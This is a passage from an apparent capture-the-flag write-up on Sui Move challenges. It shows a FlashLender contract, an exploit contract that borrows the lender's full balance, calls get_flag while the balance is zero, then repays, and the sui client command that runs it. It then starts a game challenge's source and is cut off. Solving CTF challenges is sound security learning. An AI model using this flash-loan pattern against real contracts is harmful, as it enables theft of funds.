</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kd>let</span><span class=w> </span><span class=n>sender</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>tx_context</span>::<span class=n>sender</span><span class=p>(</span><span class=n>ctx</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>vec_map</span>::<span class=n>contains</span><span class=p>(</span><span class=o>&amp;</span><span class=bp>self</span><span class=p>.</span><span class=n>lender</span><span class=p>,</span><span class=w> </span><span class=o>&amp;</span><span class=n>sender</span><span class=p>))</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=kd>let</span><span class=w> </span><span class=n>balance</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>vec_map</span>::<span class=n>get_mut</span><span class=p>(</span><span class=o>&amp;</span><span class=k>mut</span><span class=w> </span><span class=bp>self</span><span class=p>.</span><span class=n>lender</span><span class=p>,</span><span class=w> </span><span class=o>&amp;</span><span class=n>sender</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=o>*</span><span class=n>balance</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=o>*</span><span class=n>balance</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>coin</span>::<span class=n>value</span><span class=p>(</span><span class=o>&amp;</span><span class=n>coin</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=k>else</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>vec_map</span>::<span class=n>insert</span><span class=p>(</span><span class=o>&amp;</span><span class=k>mut</span><span class=w> </span><span class=bp>self</span><span class=p>.</span><span class=n>lender</span><span class=p>,</span><span class=w> </span><span class=n>sender</span><span class=p>,</span><span class=w> </span><span class=n>coin</span>::<span class=n>value</span><span class=p>(</span><span class=o>&amp;</span><span class=n>coin</span><span class=p>));</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>};</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>coin</span>::<span class=n>put</span><span class=p>(</span><span class=o>&amp;</span><span class=k>mut</span><span class=w> </span><span class=bp>self</span><span class=p>.</span><span class=n>to_lend</span><span class=p>,</span><span class=w> </span><span class=n>coin</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=c1>// withdraw you token from FlashLender
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=w>    </span><span class=n>public</span><span class=w> </span><span class=n>entry</span><span class=w> </span><span class=n>fun</span><span class=w> </span><span class=n>withdraw</span><span class=p>(</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=bp>self</span>: <span class=kp>&amp;</span><span class=nc>mut</span><span class=w> </span><span class=n>FlashLender</span><span class=p>,</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>amount</span>: <span class=kt>u64</span><span class=p>,</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>ctx</span>: <span class=kp>&amp;</span><span class=nc>mut</span><span class=w> </span><span class=n>TxContext</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>){</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kd>let</span><span class=w> </span><span class=n>owner</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>tx_context</span>::<span class=n>sender</span><span class=p>(</span><span class=n>ctx</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kd>let</span><span class=w> </span><span class=n>balance</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>vec_map</span>::<span class=n>get_mut</span><span class=p>(</span><span class=o>&amp;</span><span class=k>mut</span><span class=w> </span><span class=bp>self</span><span class=p>.</span><span class=n>lender</span><span class=p>,</span><span class=w> </span><span class=o>&amp;</span><span class=n>owner</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=fm>assert!</span><span class=p>(</span><span class=o>*</span><span class=n>balance</span><span class=w> </span><span class=o>&gt;=</span><span class=w> </span><span class=n>amount</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=o>*</span><span class=n>balance</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=o>*</span><span class=n>balance</span><span class=w> </span><span class=o>-</span><span class=w> </span><span class=n>amount</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kd>let</span><span class=w> </span><span class=n>to_lend</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=o>&amp;</span><span class=k>mut</span><span class=w> </span><span class=bp>self</span><span class=p>.</span><span class=n>to_lend</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>transfer</span>::<span class=n>transfer</span><span class=p>(</span><span class=n>coin</span>::<span class=n>take</span><span class=p>(</span><span class=n>to_lend</span><span class=p>,</span><span class=w> </span><span class=n>amount</span><span class=p>,</span><span class=w> </span><span class=n>ctx</span><span class=p>),</span><span class=w> </span><span class=n>owner</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=c1>// check whether you can get the flag
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=w>    </span><span class=n>public</span><span class=w> </span><span class=n>entry</span><span class=w> </span><span class=n>fun</span><span class=w> </span><span class=n>get_flag</span><span class=p>(</span><span class=bp>self</span>: <span class=kp>&amp;</span><span class=nc>mut</span><span class=w> </span><span class=n>FlashLender</span><span class=p>,</span><span class=w> </span><span class=n>ctx</span>: <span class=kp>&amp;</span><span class=nc>mut</span><span class=w> </span><span class=n>TxContext</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>balance</span>::<span class=n>value</span><span class=p>(</span><span class=o>&amp;</span><span class=bp>self</span><span class=p>.</span><span class=n>to_lend</span><span class=p>)</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=mi>0</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>event</span>::<span class=n>emit</span><span class=p>(</span><span class=n>Flag</span><span class=w> </span><span class=p>{</span><span class=w> </span><span class=n>user</span>: <span class=nc>tx_context</span>::<span class=n>sender</span><span class=p>(</span><span class=n>ctx</span><span class=p>),</span><span class=w> </span><span class=n>flag</span>: <span class=nc>true</span><span class=w> </span><span class=p>});</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
</span></span></span></code></pre></div><p><a href=files/FlashLoan/flashloan.zip>Source</a></p><p>Inorder to get the flag, we must need to pass the FlashLender object which has a balance 0 (to_lend == 0). Otherwise, we can&rsquo;t able to get the flag. <code>to_lend</code> is decreasing only when a user takes loan from the object. So, now we need to take loan from the lender, it means we need to call <code>public fun loan(...)</code>, but from Sui Cli we only able to call <code>pub entry fun &lt;name>(...)</code>. But from another contract <code>public fun &lt;name>(...)</code> can be called. So, I tried to write a new contract with payload. But, I dont know Sui and Move. I was so obfuscated. However, after many trails and some chat with my new friend and I got to know how to do. So I got it. You can download and see .toml file to know how I&rsquo;m able to call deployed contract&rsquo;s function from my contract.
<a href=files/FlashLoan/loan.zip>ExploitContract</a></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-rs data-lang=rs><span class=line><span class=cl><span class=n>module</span><span class=w> </span><span class=n>exploit_package</span>::<span class=n>attack</span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>use</span><span class=w> </span><span class=n>movectf</span>::<span class=n>flash</span>::<span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>FlashLender</span><span class=p>,</span><span class=w> </span><span class=n>loan</span><span class=p>,</span><span class=w> 
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>FLASH</span><span class=p>,</span><span class=w> </span><span class=n>Receipt</span><span class=p>,</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>get_flag</span><span class=p>,</span><span class=n>deposit</span><span class=p>,</span><span class=n>repay</span><span class=p>,</span><span class=n>check</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>};</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>use</span><span class=w> </span><span class=n>sui</span>::<span class=n>tx_context</span>::<span class=p>{</span><span class=w> </span><span class=n>TxContext</span><span class=p>};</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=k>use</span><span class=w> </span><span class=n>sui</span>:: <span class=nc>coin</span>::<span class=p>{</span><span class=w> </span><span class=n>Coin</span><span class=p>};</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>public</span><span class=w> </span><span class=n>entry</span><span class=w> </span><span class=n>fun</span><span class=w> </span><span class=n>getFlag</span><span class=p>(</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=n>lender</span>: <span class=kp>&amp;</span><span class=nc>mut</span><span class=w> </span><span class=n>FlashLender</span><span class=p>,</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=n>payment</span>: <span class=kt>u64</span><span class=p>,</span><span class=n>ctx</span>: <span class=kp>&amp;</span><span class=nc>mut</span><span class=w> </span><span class=n>TxContext</span><span class=w> 
</span></span></span><span class=line><span class=cl><span class=w>                    </span><span class=p>){</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=kd>let</span><span class=w> </span><span class=p>(</span><span class=n>_load</span><span class=p>,</span><span class=w> </span><span class=n>receipt</span><span class=p>)</span>: <span class=p>(</span><span class=n>Coin</span><span class=o>&lt;</span><span class=n>FLASH</span><span class=o>&gt;</span><span class=p>,</span><span class=w> </span><span class=n>Receipt</span><span class=p>)</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>loan</span><span class=p>(</span><span class=n>lender</span><span class=p>,</span><span class=n>payment</span><span class=p>,</span><span class=n>ctx</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>get_flag</span><span class=p>(</span><span class=n>lender</span><span class=p>,</span><span class=n>ctx</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>repay</span><span class=p>(</span><span class=n>lender</span><span class=p>,</span><span class=n>_load</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>check</span><span class=p>(</span><span class=n>lender</span><span class=p>,</span><span class=n>receipt</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
</span></span></span></code></pre></div><p>That&rsquo;s the definition of a Flash Loan &ndash; it is a loan that exists only for the duration of the transaction, and it must be repaid before the transaction finishes. The Receipt is part of the pattern (we call it a &ldquo;Hot Potato&rdquo;) to enforce that repayment. So we must repay. but the <code>get_flag</code> only check the balance in object. So, If we takeout full balance and then call get_flag and then repay. Bamn. Done. Now we just have to call our payload contract.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ sui client --call --function getFlag --module attack --package &lt;ourDeployedAddress&gt; --args &lt;lenderAddress&gt; <span class=m>1000</span> --gas-budget <span class=m>1000</span>
</span></span></code></pre></div><p>Note: We can&rsquo;t just Drop returned receipt. There is a function there called check which accepts a Receipt, so calling that would fix things for you in one sense.</p><p>Level completed.</p><h2 id=simple-game>Simple Game</h2><p><a href=files/SimpleGame/simplegame.zip>FullCode</a></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-rs data-lang=rs><span class=line><span class=cl><span class=c1>// Hero Object - hero.move
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>const</span><span class=w> </span><span class=n>MAX_LEVEL</span>: <span class=kt>u64</span> <span class=o>=</span><span class=w> </span><span class=mi>2</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>const</span><span class=w> </span><span class=n>INITAL_HERO_HP</span>: <span class=kt>u64</span> <span class=o>=</span><span class=w> </span><span class=mi>100</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>const</span><span class=w> </span><span class=n>INITIAL_HERO_STRENGTH</span>: <span class=kt>u64</span> <span class=o>=</span><span class=w> </span><span class=mi>10</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>const</span><span class=w> </span><span class=n>INITIAL_HERO_DEFENSE</span>: <span class=kt>u64</span> <span class=o>=</span><span class=w> </span><span class=mi>5</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>const</span><span class=w> </span><span class=n>HERO_STAMINA</span>: <span class=kt>u64</span> <span class=o>=</span><span class=w> </span><span class=mi>200</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>public</span><span class=p>(</span><span class=n>friend</span><span class=p>)</span><span class=w> </span><span class=n>fun</span><span class=w> </span><span class=n>create_hero</span><span class=p>(</span><span class=n>ctx</span>: <span class=kp>&amp;</span><span class=nc>mut</span><span class=w> </span><span class=n>TxContext</span><span class=p>)</span>: <span class=nc>Hero</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>Hero</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>id</span>: <span class=nc>object</span>::<span class=n>new</span><span class=p>(</span><span class=n>ctx</span><span class=p>),</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>level</span>: <span class=mi>1</span><span class=p>,</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>stamina</span>: <span class=nc>HERO_STAMINA</span><span class=p>,</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>hp</span>: <span class=nc>INITAL_HERO_HP</span><span class=p>,</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>experience</span>: <span class=mi>0</span><span class=p>,</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>strength</span>: <span class=nc>INITIAL_HERO_STRENGTH</span><span class=p>,</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>defense</span>: <span class=nc>INITIAL_HERO_DEFENSE</span><span class=p>,</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>sword</span>: <span class=nc>option</span>::<span class=n>none</span><span class=p>(),</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>armor</span>: <span class=nc>option</span>::<span class=n>none</span><span class=p>(),</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=sd>/// Strength of the hero when attacking
</span></span></span><span class=line><span class=cl><span class=sd></span><span class=n>public</span><span class=w> </span><span class=n>fun</span><span class=w> </span><span class=n>strength</span><span class=p>(</span><span class=n>hero</span>: <span class=kp>&amp;</span><span class=nc>Hero</span><span class=p>)</span>: <span class=kt>u64</span> <span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=c1>// a hero with zero HP is too tired to fight
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=w>    </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>hero</span><span class=p>.</span><span class=n>hp</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=mi>0</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=mi>0</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>};</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>let</span><span class=w> </span><span class=n>sword_strength</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>option</span>::<span class=n>is_some</span><span class=p>(</span><span class=o>&amp;</span><span class=n>hero</span><span class=p>.</span><span class=n>sword</span><span class=p>))</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>inventory</span>::<span class=n>strength</span><span class=p>(</span><span class=n>option</span>::<span class=n>borrow</span><span class=p>(</span><span class=o>&amp;</span><span class=n>hero</span><span class=p>.</span><span class=n>sword</span><span class=p>))</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w> </span><span class=k>else</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// hero can fight without a sword, but will not be very strong
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=w>        </span><span class=mi>0</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>};</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>hero</span><span class=p>.</span><span class=n>strength</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>sword_strength</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=sd>/// Defense of the hero when attacking
</span></span></span><span class=line><span class=cl><span class=sd></span><span class=n>public</span><span class=w> </span><span class=n>fun</span><span class=w> </span><span class=n>defense</span><span class=p>(</span><span class=n>hero</span>: <span class=kp>&amp;</span><span class=nc>Hero</span><span class=p>)</span>: <span class=kt>u64</span> <span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=c1>// a hero with zero HP is too tired to fight
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=w>    </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>hero</span><span class=p>.</span><span class=n>hp</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=mi>0</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=mi>0</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>};</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>let</span><span class=w> </span><span class=n>armor_defense</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>option</span>::<span class=n>is_some</span><span class=p>(</span><span class=o>&amp;</span><span class=n>hero</span><span class=p>.</span><span class=n>armor</span><span class=p>))</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>inventory</span>::<span class=n>defense</span><span class=p>(</span><span class=n>option</span>::<span class=n>borrow</span><span class=p>(</span><span class=o>&amp;</span><span class=n>hero</span><span class=p>.</span><span class=n>armor</span><span class=p>))</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w> </span><span class=k>else</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// hero can fight without a sword, but will not be very strong
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=w>        </span><span class=mi>0</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>};</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>hero</span><span class=p>.</span><span class=n>defense</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>armor_defense</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>public</span><span class=w> </span><span class=n>fun</span><span class=w> </span><span class=n>hp</span><span class=p>(</span><span class=n>hero</span>: <span class=kp>&amp;</span><span class=nc>Hero</span><span class=p>)</span>: <span class=kt>u64</span> <span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>hero</span><span class=p>.</span><span class=n>hp</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
</span></span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-rs data-lang=rs><span class=line><span class=cl><span class=c1>// Sword, Armor and TreasureBox objects - Inventroy.move
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>const</span><span class=w> </span><span class=n>MAX_RARITY</span>: <span class=kt>u64</span> <span class=o>=</span><span class=w> </span><span class=mi>5</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>const</span><span class=w> </span><span class=n>BASE_SWORD_STRENGTH</span>: <span class=kt>u64</span> <span class=o>=</span><span class=w> </span><span class=mi>2</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>const</span><span class=w> </span><span class=n>BASE_ARMOR_DEFENSE</span>: <span class=kt>u64</span> <span class=o>=</span><span class=w> </span><span class=mi>1</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=sd>/// The hero&#39;s trusty sword
</span></span></span><span class=line><span class=cl><span class=sd></span><span class=k>struct</span> <span class=nc>Sword</span><span class=w> </span><span class=n>has</span><span class=w> </span><span class=n>store</span><span class=w> </span><span class=p>{</span><span class=w>   
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>rarity</span>: <span class=kt>u64</span><span class=p>,</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>strength</span>: <span class=kt>u64</span><span class=p>,</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=sd>/// Armor
</span></span></span><span class=line><span class=cl><span class=sd></span><span class=k>struct</span> <span class=nc>Armor</span><span class=w> </span><span class=n>has</span><span class=w> </span><span class=n>store</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>rarity</span>: <span class=kt>u64</span><span class=p>,</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>defense</span>: <span class=kt>u64</span><span class=p>,</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=sd>///TreasuryBox
</span></span></span><span class=line><span class=cl><span class=sd></span><span class=k>struct</span> <span class=nc>TreasuryBox</span><span class=w> </span><span class=n>has</span><span class=w> </span><span class=n>key</span><span class=p>,</span><span class=w> </span><span class=n>store</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>id</span>: <span class=nc>UID</span><span class=p>,</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
</span></span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-rs data-lang=rs><span class=line><span class=cl><span class=c1>// SPDX-License-Identifier: Apache-2.0
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=sd>/// Example of a game character with basic attributes, inventory, and
</span></span></span><span class=line><span class=cl><span class=sd>/// associated logic.
</span></span></span><span class=line><span class=cl><span class=sd></span><span class=n>module</span><span class=w> </span><span class=n>game</span>::<span class=n>adventure</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=sd>/// A creature that the hero can slay to level up
</span></span></span><span class=line><span class=cl><span class=sd></span><span class=k>struct</span> <span class=nc>Monster</span><span class=o>&lt;</span><span class=n>phantom</span><span class=w> </span><span class=n>T</span><span class=o>&gt;</span><span class=w> </span><span class=n>has</span><span class=w> </span><span class=n>key</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>id</span>: <span class=nc>UID</span><span class=p>,</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>hp</span>: <span class=kt>u64</span><span class=p>,</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>strength</span>: <span class=kt>u64</span><span class=p>,</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=n>defense</span>: <span class=kt>u64</span><span class=p>,</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>struct</span> <span class=nc>Boar</span><span class=w> </span><span class=p>{}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>struct</span> <span class=nc>BoarKing</span><span class=w> </span><span class=p>{}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=sd>/// Boar attributes values
</span></span></span><span class=line><span class=cl><span class=sd></span><span class=k>const</span><span class=w> </span><span class=n>BOAR_MIN_HP</span>: <span class=kt>u64</span> <span class=o>=</span><span class=w> </span><span class=mi>80</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>const</span><span class=w> </span><span class=n>BOAR_MAX_HP</span>: <span class=kt>u64</span> <span class=o>=</span><span class=w> </span><span class=mi>120</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>const</span><span class=w> </span><span class=n>BOAR_MIN_STRENGTH</span>: <span class=kt>u64</span> <span class=o>=</span><span class=w> </span><span class=mi>5</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>const</span><span class=w> </span><span class=n>BOAR_MAX_STRENGTH</span>: <span class=kt>u64</span> <span class=o>=</span><span class=w> </span><span class=mi>15</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>const</span><span class=w> </span><span class=n>BOAR_MIN_DEFENSE</span>: <span class=kt>u64</span> <span class=o>=</span><span class=w> </span><span class=mi>4</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>const</span><span class=w> </span><span class=n>BOAR_MAX_DEFENSE</span>: <span class=kt>u64</span> <span class=o>=</span><span class=w> </span><span class=mi>6</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=sd>/// BoarKing attributes values
</span></span></span><span class=line><span class=cl><span class=sd></span><span class=k>const</span><span class=w> </span><span class=n>BOARKING_MIN_HP</span>: <span class=kt>u64</span> <span class=o>=</span><span class=w> </span><span class=mi>180</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>const</span><span class=w> </span><span class=n>BOARKING_MAX_HP</span>: <span class=kt>u64</span> <span class=o>=</span><span class=w> </span><span class=mi>220</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>const</span><span class=w> </span><span class=n>BOARKING_MIN_STRENGTH</span>: <span class=kt>u64</span> <span class=o>=</span><span class=w> </span><span class=mi>20</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>const</span><span class=w> </span><span class=n>BOARKING_MAX_STRENGTH</span>: <span class=kt>u64</span> <span class=o>=</span><span class=w> </span><span class=mi>25</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>const</span><span class=w> </span><span class=n>BOARKING_MIN_DEFENSE</span>: <span class=kt>u64</span> <span class=o>=</span><span class=w> </span><span class=mi>10</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>const</span><span class=w> </span><span class=n>BOARKING_MAX_DEFENSE</span>: <span class=kt>u64</span> <span class=o>=</span><span class=w> </span><span class=mi>15</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>fun</span><span class=w> </span><span class=n>create_monster</span><span class=o>&lt;</span><span class=n>T</span><span class=o>&gt;</span><span class=p>(</span><span class=w>
